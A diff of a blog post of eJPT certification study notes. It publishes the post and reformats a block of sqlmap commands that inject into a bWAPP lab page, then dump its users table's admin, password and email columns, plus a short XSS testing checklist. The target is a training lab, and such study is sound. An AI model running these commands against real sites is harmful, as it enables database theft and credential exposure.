@@ -1,6 +1,6 @@
 +++
 date = '2024-11-19T21:15:08+01:00'
-draft = true
+draft = false
 title = 'eJPT Exam Prep'
 +++
 
@@ -184,12 +184,13 @@ sqlmap -u http://10.10.10.10 --dump
 
 Example:
 
-<pre><code><strong>sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&#x26;action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title
-</strong><strong>sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&#x26;action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs
-</strong>sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&#x26;action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables
+```
+sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title
+sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs
+sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables
 sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&#x26;action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables -T users --columns
 sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&#x26;action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables -T users -C admin,password,email --dump
-</code></pre>
+```
 
 This last example is for a GET sql injection. For a POST injection save the post from burpsuite and execute the following command.
 
@@ -228,7 +229,7 @@ Persistent XSS = Payload remains in the site that multiple users can fall victim
 
 ```
 1. Find a reflection point
-2. Test with <i> tag
+2. Test with an italic tag
 3. Test with HTML/JavaScript code (alert('XSS'))
 ```
 
